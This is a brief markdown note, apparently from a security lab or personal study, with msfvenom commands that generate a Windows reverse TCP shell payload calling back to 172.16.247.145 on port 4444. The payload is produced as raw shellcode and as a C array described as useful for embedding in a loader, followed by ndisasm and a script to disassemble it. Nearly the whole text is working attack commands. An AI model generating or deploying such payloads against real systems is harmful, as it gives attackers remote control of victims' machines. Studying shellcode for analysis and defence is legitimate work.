### Payload Generation

```bash
# Raw shellcode blob
msfvenom -p windows/shell_reverse_tcp \
  LHOST=172.16.247.145 LPORT=4444 \
  -f raw -o shell_reverse.bin

# C array format — useful for embedding in a loader
msfvenom -p windows/shell_reverse_tcp \
  LHOST=172.16.247.145 LPORT=4444 \
  -f c -o shell_reverse.c

# Check size and encoding
msfvenom -p windows/shell_reverse_tcp \
  LHOST=172.16.247.145 LPORT=4444 \
  -f raw | wc -c

```

### Disassemble

```bash
ndisasm -b 32 shell_reverse.bin | less
```

```bash
uv run python3 disasm.py > shell_reverse.asm
```
